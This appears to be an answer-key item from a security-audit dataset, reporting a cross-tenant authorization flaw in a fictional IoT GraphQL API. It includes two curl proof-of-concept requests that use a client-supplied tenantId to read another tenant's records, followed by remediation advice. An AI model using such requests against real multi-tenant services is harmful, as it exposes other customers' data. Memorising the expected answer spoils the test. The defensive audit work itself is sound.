# Expected Response

## System
- Domain: Waste Management / IoT
- System: CleanRoute IoT Platform
- Example ID: GQL-0092

## Priority Findings

### Finding 1: Cross-Tenant Waste Management IoT Record Access — Multi-Tenant Client-Supplied tenantId (Pattern 1.5)
**Severity:** Critical
**Category:** BOLA / Multi-Tenant Access

**Summary:**
Per §5.0 (Pattern 1.5 — multi-tenant/cross-tenant access): The API trusts client-supplied `tenantId` instead of using the JWT. An attacker from `tenant-f6b3` used `bulkResourceLookup` to retrieve IoT route/vehicle records (`R-2092`, `R-1092`, `R-3092`) belonging to `tenant-c668`. In waste management IoT, this exposes fleet location data, route schedules, operational efficiency metrics, and sensor telemetry.

**Evidence from HAR:**
- Request: `POST https://api.cleanroute-iot-plat.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-f6b3`
- Mutation: `bulkResourceLookup(ids: ["R-2092", "R-1092", "R-3092"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-c668"`, `ownerId: "other-user-f6b3c668"`, `sensitiveField: "CONFIDENTIAL-f6b3c668"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-f6b3c668`

## Steps to Reproduce

### Step 1 — Bulk cross-tenant IoT route record access (HAR)
```bash
curl -s -X POST https://api.cleanroute-iot-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f6b3" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2092\", \"R-1092\", \"R-3092\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-f6b3c668` from `tenant-c668`. **Secure:** FORBIDDEN.

### Step 2 — listResources with client tenantId
```bash
curl -s -X POST https://api.cleanroute-iot-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f6b3" \
  -d '{"query": "query { listResources(tenantId: \"tenant-c668\") { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Client-supplied tenantId accepted.

## Remediation
1. Per-ID ownership filter in `bulkResourceLookup`.
2. `listResources` must use JWT `tenantId` — discard client argument.
3. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
